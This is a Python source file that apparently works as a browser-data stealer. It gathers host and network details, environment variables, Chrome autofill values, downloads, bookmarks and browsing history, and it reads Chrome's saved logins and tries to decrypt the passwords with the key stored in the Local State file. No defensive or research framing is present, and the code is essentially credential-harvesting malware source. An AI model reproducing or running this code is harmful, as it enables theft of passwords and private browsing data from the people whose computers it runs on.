import os
import json
import shutil
import sqlite3
import base64
import subprocess
from datetime import datetime, timezone, timedelta
import platform
import socket
import getpass
import psutil
from Cryptodome.Cipher import AES
import uuid
# OS detection
WINDOWS = os.name == 'nt'



try:
    import GPUtil
except ImportError:
    GPUtil = None  # Optional GPU support


def get_system_info():
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    uptime = str(datetime.now() - boot_time)

    # Network interfaces with IPs
    net_info = {}
    for interface, addrs in psutil.net_if_addrs().items():
        net_info[interface] = [addr.address for addr in addrs if addr.family == socket.AF_INET]

    # CPU usage per core
    cpu_usage_per_core = psutil.cpu_percent(percpu=True)
    cpu_usage_total = psutil.cpu_percent()

    # Battery info
    battery = psutil.sensors_battery()
    battery_info = {
        "percent": battery.percent,
        "charging": battery.power_plugged
    } if battery else None

    # GPU info (if available)
    gpu_info = []
    if GPUtil:
        gpus = GPUtil.getGPUs()
        for gpu in gpus:
            gpu_info.append({
                "name": gpu.name,
                "load": f"{gpu.load * 100:.1f}%",
                "memory_total": f"{gpu.memoryTotal}MB",
                "memory_used": f"{gpu.memoryUsed}MB",
                "temperature": f"{gpu.temperature}°C"
            })

    macs = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            # Address family for MAC varies across OSes
            if (
                    addr.family == psutil.AF_LINK or
                    (hasattr(socket, "AF_PACKET") and addr.family == socket.AF_PACKET)
            ):
                if addr.address and len(addr.address.split(":")) == 6 and "00:00:00:00:00:00" not in addr.address:
                    macs.append((interface, addr.address))
    return {
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "architecture": platform.architecture()[0],
        "machine": platform.machine(),
        "processor": platform.processor(),
        "cpu_cores": psutil.cpu_count(logical=False),
        "cpu_threads": psutil.cpu_count(logical=True),
        "cpu_usage_total_percent": cpu_usage_total,
        "cpu_usage_per_core_percent": cpu_usage_per_core,
        "ram_total_gb": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "ram_available_gb": round(psutil.virtual_memory().available / (1024 ** 3), 2),
        "ram_usage_percent": psutil.virtual_memory().percent,
        "disk_total_gb": round(psutil.disk_usage('/').total / (1024 ** 3), 2),
        "disk_used_gb": round(psutil.disk_usage('/').used / (1024 ** 3), 2),
        "disk_free_gb": round(psutil.disk_usage('/').free / (1024 ** 3), 2),
        "disk_usage_percent": psutil.disk_usage('/').percent,
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "hostname": socket.gethostname(),
        # "mac_address": ':'.join(['{:02x}'.format((uuid := uuid.getnode()) >> i & 0xff)
        #                  for i in range(0, 8 * 6, 8)][::-1]),

        "python_version": platform.python_version(),
        "system_uuid" : str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname())),

        "boot_time": boot_time.strftime("%Y-%m-%d %H:%M:%S"),
        "uptime": uptime,
        "current_user": getpass.getuser(),
        "env_vars_sample": dict(list(os.environ.items())[:5]),
        "battery_info": battery_info,
        "network_interfaces": net_info,
        "running_processes": len(psutil.pids()),
        "gpu_info": gpu_info or "GPUs not available or GPUtil not installed",
        "get_mac" : subprocess.check_output("ifconfig", shell=True).decode(),
        "mac_address":macs


    }



def get_chrome_path(*path_parts):
    try:
        base = os.environ['USERPROFILE'] if WINDOWS else os.path.expanduser('~')
        return os.path.join(base, *path_parts)
    except KeyError:
        raise EnvironmentError("Environment variable 'USERPROFILE' not found")

def chrome_timestamp_to_datetime(chrome_time):
    if chrome_time:
        return datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=chrome_time)
    return None

def list_extensions():
    try:
        ext_path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Extensions'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Default/Extensions')

        if os.path.exists(ext_path):
            return {"extensions": os.listdir(ext_path)}
        return {"extensions": [], "error": "Extensions directory not found"}
    except Exception as e:
        return {"extensions": [], "error": str(e)}

# def get_user_profile():
#     try:
#         path = get_chrome_path(
#             'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
#         ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Local State')
#
#         with open(path, 'r', encoding='utf-8') as f:
#             data = json.load(f)
#         return {"profile": data.get('profile', {})}
#     except Exception as e:
#         return {"profile": {}, "error": str(e)}

def get_user_profile():
    try:
        path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Local State')

        print("Profile path:", path)

        if not os.path.exists(path):
            return {"profile": {}, "error": f"Path does not exist: {path}"}

        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)

        print("Local State JSON keys:", data.keys())

        return {"profile": data.get('profile', data)}  # fallback
    except Exception as e:
        return {"profile": {}, "error": str(e)}


def get_autofill():
    try:
        db_path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Default/Web Data')

        temp_db = 'WebData_temp'
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        return {"autofill": [{"name": name, "value": value} for name, value in rows]}
    except Exception as e:
        return {"autofill": [], "error": str(e)}

def get_downloads():
    try:
        db_path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Default/History')

        temp_db = 'Downloads_temp'
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT target_path, tab_url
            FROM downloads
            JOIN downloads_url_chains ON downloads.id = downloads_url_chains.id
        """)
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        return {"downloads": [{"file_path": f, "source_url": u} for f, u in rows]}
    except Exception as e:
        return {"downloads": [], "error": str(e)}

def get_saved_passwords():
    try:
        db_path = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
        if not os.path.exists(db_path):
            return {"passwords": [], "error": "Login Data not found"}

        temp_db = 'Login_temp'
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        results = []
        for url, username, encrypted_password in cursor.fetchall():
            decrypted = decrypt_password(encrypted_password)
            if decrypted:
                results.append({"url": url, "username": username, "password": decrypted})
        conn.close()
        os.remove(temp_db)
        return {"passwords": results}
    except Exception as e:
        return {"passwords": [], "error": str(e)}

def decrypt_password(encrypted_password):
    try:
        if not encrypted_password.startswith(b'v10'):
            return None
        key = get_encryption_key()
        iv = encrypted_password[3:15]
        ciphertext = encrypted_password[15:-16]
        tag = encrypted_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except Exception:
        return None

def get_encryption_key():
    try:
        local_state_path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Local State')

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Strip "DPAPI" or prefix
        return encrypted_key  # Note: On Windows, further DPAPI decryption is needed
    except Exception:
        return None

# def get_bookmarks():
#     try:
#         path = get_chrome_path(
#             'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks'
#         ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Default/Bookmarks')
#
#         with open(path, 'r', encoding='utf-8') as f:
#             bookmarks = json.load(f)
#         return {"bookmarks": bookmarks}
#     except Exception as e:
#         return {"bookmarks": {}, "error": str(e)}

def get_bookmarks():
    try:
        path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Default/Bookmarks')

        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)

        def extract_bookmarks(bookmark_node):
            bookmarks = []
            if bookmark_node.get('type') == 'url':
                bookmarks.append({
                    'name': bookmark_node.get('name'),
                    'url': bookmark_node.get('url')
                })
            elif 'children' in bookmark_node:
                for child in bookmark_node['children']:
                    bookmarks.extend(extract_bookmarks(child))
            return bookmarks

        all_bookmarks = []
        roots = data.get('roots', {})
        for root in roots.values():
            all_bookmarks.extend(extract_bookmarks(root))

        return {"bookmarks": all_bookmarks}
    except Exception as e:
        return {"bookmarks": [], "error": str(e)}



def get_browsing_history(limit=10):
    try:
        db_path = get_chrome_path(
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'
        ) if WINDOWS else os.path.expanduser('~/.config/google-chrome/Default/History')

        temp_db = 'History_temp'
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        return {
            "history": [
                {"url": url, "title": title, "visited": chrome_timestamp_to_datetime(visit_time)}
                for url, title, visit_time in rows
            ]
        }
    except Exception as e:
        return {"history": [], "error": str(e)}
